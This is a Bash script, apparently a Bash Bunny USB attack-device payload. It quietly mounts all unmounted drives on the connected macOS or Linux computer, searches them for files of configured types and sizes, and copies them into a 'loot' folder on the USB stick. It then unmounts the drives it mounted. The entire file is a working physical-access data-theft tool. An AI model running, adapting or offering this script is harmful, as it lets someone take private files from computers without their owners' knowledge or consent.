#!/bin/bash

# Variables (defined by user in payload.txt)
mountpt=$(mount | grep -i BashBunny | cut -d ' ' -f 3)
lootdir=$mountpt/loot/hss
target_directory=$(grep -hi hss_target_directory $mountpt/HSS/payload.txt | cut -c 22-)
target_extensions="$(grep -hi hss_target_extensions $mountpt/HSS/payload.txt | cut -c 23-)"
find_file_size=$(grep -hi hss_find_file_size $mountpt/HSS/payload.txt | cut -c 20-)

###### Create loot directory and remove nosferatu if it already exists, which serves as the indicator whether or not the script has fully completed in the past ######

mkdir -p $lootdir
cd $lootdir
rm nosferatu
mkdir ./backup
touch ./checksums.txt
chmod 777 ./backup/ ./checksums.txt

mounted=" "
mntdir=" "

###### Mount all unmounted, connected drives and store theier device name to unmount them again at the end of the script ######

# For MacOS
if uname | grep -i darwin; then for i in `ls /dev | awk -v s="disk" 'index($0, s) == 1'`; do if diskutil info $i | grep -i "Mounted" | grep -qi "Yes"; then :; else mounted+="$i " && diskutil mountDisk $i; fi; done; fi

# For Linux
if uname | grep -i darwin; then :; else
partitions=$(lsblk -o NAME,MOUNTPOINT -nr)
while IFS= read -r line; do
    name=$(echo "$line" | awk '{print $1}')
    mountpoint=$(echo "$line" | awk '{print $2}')
    # Check if the partition is not mounted
    if [ -z "$mountpoint" ]; then
        # Attempt to mount the partition
        udisksctl mount -b "/dev/$name" && mounted+="/dev/$name "
    fi
done <<< "$partitions"
fi

###### Find all files under a given directory of a given size and filetype, copy the files to a folder on the USB drive, and save their checksums to a running list ######
find "$target_directory" -path "$mountpt/loot/hss" -prune -o -size $find_file_size -type f \( -name "" `for i in ${target_extensions[@]}; do echo "-o -iname "*.$i" "; done` \) -exec echo {} ';' | while read p; do
  if cat ./checksums.txt | grep -qw `cksum "$(echo "$p" | tr -d '\\\')" | cut -d ' ' -f1`; then
    :
  else
    if [ -f "./backup/${p##*/}" ]; then
      cp "$p" "./backup/`cksum "$(echo "$p" | tr -d '\\\')" | cut -d ' ' -f1`_${p##*/}"
      if [ $? -ne 0 ] ; then
        # Provide indication the drive was full, and unmount only the disks that were mounted at the beginning of the script
        touch ./disk_drive_full
        if uname | grep -i darwin; then for i in $mounted; do diskutil unmountDisk $i; done; fi
        if uname | grep -i darwin; then :; else for i in $mounted; do udisksctl unmount -b $i; done; fi
        exit 1
      else
        echo `cksum "$(echo "$p" | tr -d '\\\')" | cut -d ' ' -f1` >> ./checksums.txt
      fi
    else
      cp "$p" "./backup/"
      if [ $? -ne 0 ] ; then
        # Provide indication the drive was full, and unmount only the disks that were mounted at the beginning of the script
        touch ./disk_drive_full
        if uname | grep -i darwin; then for i in $mounted; do diskutil unmountDisk $i; done; fi
        if uname | grep -i darwin; then :; else for i in $mounted; do udisksctl unmount -b $i; done; fi
        exit 1
      else
        echo `cksum "$(echo "$p" | tr -d '\\\')" | cut -d ' ' -f1` >> ./checksums.txt
      fi
    fi
  fi
done

###### Unmount only the disks that were mounted at the beginning of the script, and provide indication that the script completed successfully ######
if [ $? -ne 0 ] ; then
  :
else
  if uname | grep -i darwin; then for i in $mounted; do diskutil unmountDisk $i; done; fi
  if uname | grep -i darwin; then :; else for i in $mounted; do udisksctl unmount -b $i; done; fi
  touch nosferatu
fi
